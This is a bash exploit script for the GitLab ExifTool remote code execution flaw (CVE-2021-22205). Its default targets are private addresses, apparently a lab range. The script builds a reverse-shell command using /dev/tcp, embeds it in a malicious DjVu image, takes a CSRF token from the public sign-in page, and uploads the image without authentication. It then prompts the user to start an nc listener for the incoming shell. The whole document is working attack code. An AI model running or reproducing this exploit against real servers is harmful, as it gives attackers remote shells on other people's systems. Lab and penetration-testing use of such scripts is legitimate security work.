#!/bin/bash
# GitLab ExifTool RCE (CVE-2021-22205)
# Usage: ./02-exiftool-rce.sh [GITLAB_HOST] [LHOST] [LPORT]

set -e

GITLAB_HOST="${1:-172.26.0.30}"
GITLAB_PORT=80
LHOST="${2:-172.26.0.10}"
LPORT="${3:-4445}"

PAYLOAD_DIR="/opt/payloads"
PAYLOAD_IMAGE="/tmp/exploit.jpg"
COOKIE_JAR=$(mktemp)
trap 'rm -f "$COOKIE_JAR"' EXIT

echo "[*] GitLab ExifTool RCE (CVE-2021-22205)"
echo "[*] Target: ${GITLAB_HOST}:${GITLAB_PORT}"
echo "[*] Callback: ${LHOST}:${LPORT}"
echo ""

# Step 1: Generate the malicious image
echo "[1/3] Generating malicious DjVu payload image..."
REVERSE_SHELL="bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"
python3 "$PAYLOAD_DIR/gen_payload_image.py" "$REVERSE_SHELL" "$PAYLOAD_IMAGE"

# Step 2: Fetch CSRF token from the public sign-in page.
# GitLab rejects uploads without a valid CSRF token before ExifTool runs,
# so we harvest the token from an unauthenticated page and replay it.
echo "[2/3] Fetching CSRF token from sign-in page..."
SIGN_IN_HTML=$(curl -s -c "$COOKIE_JAR" "http://${GITLAB_HOST}:${GITLAB_PORT}/users/sign_in")
CSRF_TOKEN=$(echo "$SIGN_IN_HTML" \
  | grep -oE 'name="csrf-token" content="[^"]+"' \
  | head -1 \
  | sed -E 's/.*content="([^"]+)".*/\1/')

if [ -z "$CSRF_TOKEN" ]; then
    echo "[!] Failed to extract CSRF token — sign-in page layout may have changed."
    exit 1
fi
echo "      Token: ${CSRF_TOKEN:0:40}..."

# Step 3: Upload payload with the harvested CSRF token and session cookies
echo "[3/3] Uploading payload to GitLab..."

HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -b "$COOKIE_JAR" \
  -H "X-CSRF-Token: ${CSRF_TOKEN}" \
  -F "file=@${PAYLOAD_IMAGE}" \
  "http://${GITLAB_HOST}:${GITLAB_PORT}/uploads/user")

echo "      HTTP Response: ${HTTP_CODE}"
echo ""

# 422 is the expected response — GitLab rejects the image as invalid AFTER
# ExifTool has already processed its metadata and triggered the exploit.
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "422" ]; then
    echo "[*] Payload uploaded and processed by ExifTool."
    echo "[*] If successful, reverse shell connects to ${LHOST}:${LPORT}"
    echo "[*] Start listener with: nc -lvnp ${LPORT}"
else
    echo "[!] Upload failed (HTTP $HTTP_CODE). Check GitLab logs."
fi
